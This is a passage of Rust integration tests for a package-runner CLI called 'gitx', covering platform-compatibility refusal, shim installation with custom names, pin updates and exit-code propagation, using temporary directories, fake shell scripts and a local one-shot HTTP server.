        serde_json::from_slice(&std::fs::read(&record).unwrap()).unwrap();
    body["metadata"]["os"] = serde_json::json!(["!linux"]);
    std::fs::write(&record, serde_json::to_vec_pretty(&body).unwrap()).unwrap();

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .args(["inspect", "npm:demo@1.2.3"])
        .assert()
        .success()
        .stdout(predicate::str::contains("Compatibility: incompatible"))
        .stdout(predicate::str::contains("Platform constraints: OS: !linux"))
        .stdout(predicate::str::contains("Policy: deny"));

    let fake_bin = tempfile::tempdir().unwrap();
    let npm = fake_bin.path().join("npm");
    std::fs::write(&npm, "#!/bin/sh\nexit 0\n").unwrap();
    std::fs::set_permissions(&npm, std::fs::Permissions::from_mode(0o755)).unwrap();

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .env("PATH", fake_bin.path())
        .args(["exec", "demo@1.2.3", "--backend", "npm", "--preview"])
        .assert()
        .success()
        .stderr(predicate::str::contains("Compatibility: incompatible"))
        .stderr(predicate::str::contains("Policy: deny"));

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .env("PATH", fake_bin.path())
        .args(["exec", "demo@1.2.3", "--backend", "npm", "--yes"])
        .assert()
        .failure()
        .stderr(predicate::str::contains(
            "refusing to run package(s) that exclude this host",
        ));
}

#[cfg(unix)]
#[test]
fn installed_shim_forwards_arguments_to_the_pinned_target() {
    use std::os::unix::fs::PermissionsExt;

    let cache = tempfile::tempdir().unwrap();
    let home = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);

    let mut install = Command::cargo_bin("gitx").unwrap();
    install
        .env("GITX_CACHE_DIR", cache.path())
        .env("GITX_HOME", home.path())
        .args(["install", "demo@1.2.3"])
        .assert()
        .success()
        .stdout(predicate::str::contains("Pinned: npm:demo@1.2.3"));

    let fake_bin = tempfile::tempdir().unwrap();
    let fake_gitx = fake_bin.path().join("gitx");
    std::fs::write(
        &fake_gitx,
        "#!/bin/sh\nprintf '%s\\n' \"$@\" > \"$CAPTURE\"\n",
    )
    .unwrap();
    std::fs::set_permissions(&fake_gitx, std::fs::Permissions::from_mode(0o755)).unwrap();
    let capture = home.path().join("captured-args");
    let path = std::env::join_paths(
        std::iter::once(fake_bin.path().to_path_buf()).chain(
            std::env::var_os("PATH")
                .as_deref()
                .map(std::env::split_paths)
                .into_iter()
                .flatten(),
        ),
    )
    .unwrap();

    let status = std::process::Command::new(home.path().join("bin/demo"))
        .args(["hello", "two words"])
        .env("PATH", path)
        .env("CAPTURE", &capture)
        .status()
        .unwrap();

    assert!(status.success());
    assert_eq!(
        std::fs::read_to_string(capture).unwrap(),
        "exec\ndemo@1.2.3\n--yes\n--\nhello\ntwo words\n"
    );
}

#[cfg(unix)]
#[test]
fn install_can_use_a_custom_shim_name() {
    let cache = tempfile::tempdir().unwrap();
    let home = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", cache.path())
        .env("GITX_HOME", home.path())
        .args(["install", "demo@1.2.3", "--as", "demo-tool"])
        .assert()
        .success()
        .stdout(predicate::str::contains("Installed demo-tool"));

    assert!(home.path().join("bin/demo-tool").is_file());
    assert!(home.path().join("installed/demo-tool.json").is_file());
    assert!(!home.path().join("bin/demo").exists());
}

#[test]
fn install_rejects_an_invalid_custom_name_before_source_resolution() {
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["install", "demo@1.2.3", "--as", "../not-a-tool"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("invalid installed tool name"));
}

#[cfg(unix)]
#[test]
fn update_check_resolves_without_changing_an_installed_pin() {
    let cache = tempfile::tempdir().unwrap();
    let home = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    seed_installed_npm_tool(home.path(), "demo-tool", "npm:demo@1.2.3", "npm:demo@1.2.2");
    let record_path = home.path().join("installed/demo-tool.json");
    let before = std::fs::read(&record_path).unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", cache.path())
        .env("GITX_HOME", home.path())
        .args(["update", "demo-tool", "--check"])
        .assert()
        .success()
        .stdout(predicate::str::contains("Current: npm:demo@1.2.2"))
        .stdout(predicate::str::contains("Resolved: npm:demo@1.2.3"))
        .stdout(predicate::str::contains(
            "Action: would replace the pinned target",
        ));

    assert_eq!(std::fs::read(&record_path).unwrap(), before);
}

#[cfg(unix)]
#[test]
fn update_replaces_the_pin_and_preserves_the_installed_name() {
    let cache = tempfile::tempdir().unwrap();
    let home = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    seed_installed_npm_tool(home.path(), "demo-tool", "npm:demo@1.2.3", "npm:demo@1.2.2");
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", cache.path())
        .env("GITX_HOME", home.path())
        .args(["update", "demo-tool"])
        .assert()
        .success()
        .stdout(predicate::str::contains("Updated pin: npm:demo@1.2.3"));

    let record: serde_json::Value = serde_json::from_slice(
        &std::fs::read(home.path().join("installed/demo-tool.json")).unwrap(),
    )
    .unwrap();
    assert_eq!(record["name"], "demo-tool");
    assert_eq!(record["pinned"], "npm:demo@1.2.3");
    assert!(std::fs::read_to_string(home.path().join("bin/demo-tool"))
        .unwrap()
        .contains("gitx exec 'demo@1.2.3' --yes"));
}

#[cfg(unix)]
#[test]
fn update_refreshes_metadata_without_rewriting_an_unchanged_shim() {
    let cache = tempfile::tempdir().unwrap();
    let home = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    seed_installed_npm_tool(home.path(), "demo-tool", "npm:demo@1.2.3", "npm:demo@1.2.3");
    let shim_path = home.path().join("bin/demo-tool");
    let shim_before = std::fs::read(&shim_path).unwrap();

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_CACHE_DIR", cache.path())
        .env("GITX_HOME", home.path())
        .args(["update", "demo-tool"])
        .assert()
        .success()
        .stdout(predicate::str::contains(
            "Description: <none> -> hermetic CLI fixture",
        ))
        .stdout(predicate::str::contains("Updated metadata."));

    assert_eq!(std::fs::read(&shim_path).unwrap(), shim_before);
    let record: serde_json::Value = serde_json::from_slice(
        &std::fs::read(home.path().join("installed/demo-tool.json")).unwrap(),
    )
    .unwrap();
    assert_eq!(record["description"], "hermetic CLI fixture");
}

#[cfg(unix)]
#[test]
fn update_missing_tool_fails_cleanly() {
    let home = tempfile::tempdir().unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_HOME", home.path())
        .args(["update", "missing-tool"])
        .assert()
        .failure()
        .stderr(predicate::str::contains("`missing-tool` is not installed"));
}

#[cfg(unix)]
#[test]
fn update_all_updates_stale_tools_and_reports_a_summary() {
    let cache = tempfile::tempdir().unwrap();
    let home = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    seed_installed_npm_tool(
        home.path(),
        "demo-stale",
        "npm:demo@1.2.3",
        "npm:demo@1.2.2",
    );
    seed_fully_resolved_npm_tool(home.path(), "demo-fresh", "npm:demo@1.2.3");
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", cache.path())
        .env("GITX_HOME", home.path())
        .args(["update", "--all"])
        .assert()
        .success()
        .stdout(predicate::str::contains(
            "demo-stale: updated npm:demo@1.2.2 -> npm:demo@1.2.3",
        ))
        .stdout(predicate::str::contains("demo-fresh: up to date"))
        .stdout(predicate::str::contains(
            "Summary: 2 checked, 1 updated, 0 failed",
        ));

    let record: serde_json::Value = serde_json::from_slice(
        &std::fs::read(home.path().join("installed/demo-stale.json")).unwrap(),
    )
    .unwrap();
    assert_eq!(record["pinned"], "npm:demo@1.2.3");
}

#[cfg(unix)]
#[test]
fn update_all_check_reports_would_update_without_writing() {
    let cache = tempfile::tempdir().unwrap();
    let home = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    seed_installed_npm_tool(
        home.path(),
        "demo-stale",
        "npm:demo@1.2.3",
        "npm:demo@1.2.2",
    );
    let record_path = home.path().join("installed/demo-stale.json");
    let before = std::fs::read(&record_path).unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", cache.path())
        .env("GITX_HOME", home.path())
        .args(["update", "--all", "--check"])
        .assert()
        .success()
        .stdout(predicate::str::contains(
            "demo-stale: would update npm:demo@1.2.2 -> npm:demo@1.2.3",
        ))
        .stdout(predicate::str::contains(
            "Summary: 1 checked, 0 updated, 0 failed",
        ));

    assert_eq!(std::fs::read(&record_path).unwrap(), before);
}

#[cfg(unix)]
#[test]
fn update_all_without_installed_tools_prints_no_tools_installed() {
    let home = tempfile::tempdir().unwrap();

    Command::cargo_bin("gitx")
        .unwrap()
        .env("GITX_HOME", home.path())
        .args(["update", "--all"])
        .assert()
        .success()
        .stdout(predicate::str::contains("No tools installed."));
}

#[test]
fn update_requires_either_a_tool_or_the_all_flag() {
    Command::cargo_bin("gitx")
        .unwrap()
        .args(["update"])
        .assert()
        .failure();
}

#[test]
fn update_rejects_combining_a_tool_with_the_all_flag() {
    Command::cargo_bin("gitx")
        .unwrap()
        .args(["update", "demo-tool", "--all"])
        .assert()
        .failure();
}

#[cfg(unix)]
#[test]
fn update_all_continues_after_failures_and_exits_nonzero() {
    let cache = tempfile::tempdir().unwrap();
    let home = tempfile::tempdir().unwrap();
    seed_cached_package(cache.path(), "demo", "1.2.3", HELLO_INTEGRITY);
    seed_installed_npm_tool(home.path(), "demo-good", "npm:demo@1.2.3", "npm:demo@1.2.2");
    seed_installed_npm_tool(home.path(), "demo-broken", "npm:", "npm:x@0.0.0");
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env("GITX_CACHE_DIR", cache.path())
        .env("GITX_HOME", home.path())
        .args(["update", "--all"])
        .assert()
        .failure()
        .stdout(predicate::str::contains("demo-good: updated"))
        .stdout(predicate::str::contains("demo-broken: failed:"))
        .stdout(predicate::str::contains(
            "Summary: 2 checked, 1 updated, 1 failed",
        ));
}

#[cfg(unix)]
fn seed_fully_resolved_npm_tool(home: &std::path::Path, name: &str, source: &str) {
    seed_installed_npm_tool(home, name, source, source);
    let record_path = home.join("installed").join(format!("{name}.json"));
    let mut record: serde_json::Value =
        serde_json::from_slice(&std::fs::read(&record_path).unwrap()).unwrap();
    record["description"] = "hermetic CLI fixture".into();
    record["entrypoint"] = "demo".into();
    record["binaries"] = serde_json::json!(["demo"]);
    std::fs::write(&record_path, serde_json::to_vec_pretty(&record).unwrap()).unwrap();
}

#[cfg(unix)]
#[test]
fn tool_exit_code_is_preserved() {
    let temp = tempfile::tempdir().unwrap();
    std::fs::write(
        temp.path().join("gitx.toml"),
        "schema = 1\nname = \"exit-test\"\nruntime = \"shell\"\nentry = \"exit.sh\"\n",
    )
    .unwrap();
    std::fs::write(temp.path().join("exit.sh"), "exit 42\n").unwrap();
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .args(["run", temp.path().to_str().unwrap(), "--yes"])
        .assert()
        .code(42)
        .stderr(predicate::str::contains("exited with status 42"));
}

const HELLO_INTEGRITY: &str = "sha512-m3HSJL1i83hdltRq0+o9czGb+8KJDKra4t/3JRlnPKcjI8PZm6XBHXx6zG4UuMXaDEZjR1wuXDre9G9zvN7AQw==";
const HELLO_SHA512_HEX: &str = "9b71d224bd62f3785d96d46ad3ea3d73319bfbc2890caadae2dff72519673ca72323c3d99ba5c11d7c7acc6e14b8c5da0c4663475c2e5c3adef46f73bcdec043";

fn assert_remote_catalog_search(
    source: &str,
    endpoint_variable: &str,
    body: &str,
    expected_source: &str,
    expected_action: &str,
) {
    let (endpoint, server) = serve_json_once(body.to_string());
    let mut command = Command::cargo_bin("gitx").unwrap();

    command
        .env(endpoint_variable, endpoint)
        .args(["search", "tool", "--source", source, "--details", "1"])
        .assert()
        .success()
        .stdout(predicate::str::contains(expected_source))
        .stdout(predicate::str::contains(expected_action));

    server.join().unwrap();
}

fn serve_json_once(body: String) -> (String, thread::JoinHandle<()>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let address = listener.local_addr().unwrap();
    let handle = thread::spawn(move || {
        let (mut stream, _) = listener.accept().unwrap();
        let mut request = [0_u8; 4096];
        let _ = stream.read(&mut request).unwrap();
        write!(
            stream,
            "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
            body.len(),
            body
        )
        .unwrap();
    });

    (format!("http://{address}"), handle)
}

fn seed_cached_package(cache: &std::path::Path, package: &str, version: &str, integrity: &str) {
    let path = cache
        .join("npm/versions")
        .join(package)
        .join(format!("{version}.json"));
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    let body = serde_json::json!({
        "package": package,
        "version": version,
        "cached_at": 0,
        "metadata": {
            "name": package,
            "version": version,
            "description": "hermetic CLI fixture",
            "bin": "cli.js",
            "scripts": null,
            "dependencies": null,
            "optionalDependencies": null,
            "peerDependencies": null,
            "dist": {
                "tarball": null,
                "integrity": integrity,
                "shasum": null,
                "fileCount": 1,
                "unpackedSize": 5
            }
        }
    });
    std::fs::write(path, serde_json::to_vec_pretty(&body).unwrap()).unwrap();
}

fn seed_installed_npm_tool(home: &std::path::Path, name: &str, source: &str, pinned: &str) {
    let records = home.join("installed");
    let bins = home.join("bin");
    std::fs::create_dir_all(&records).unwrap();
    std::fs::create_dir_all(&bins).unwrap();
    let body = serde_json::json!({
        "name": name,
        "kind": "npm",
        "source": source,
        "pinned": pinned,
        "runtime": "node",
        "integrity": HELLO_INTEGRITY,
        "installedAt": 0
    });
    std::fs::write(
        records.join(format!("{name}.json")),
        serde_json::to_vec_pretty(&body).unwrap(),
    )
    .unwrap();
    std::fs::write(
        bins.join(name),
        format!(
            "#!/bin/sh\n# generated fixture\nexec gitx exec '{}' --yes -- \"$@\"\n",
            pinned.trim_start_matches("npm:")
        ),
    )
    .unwrap();
}
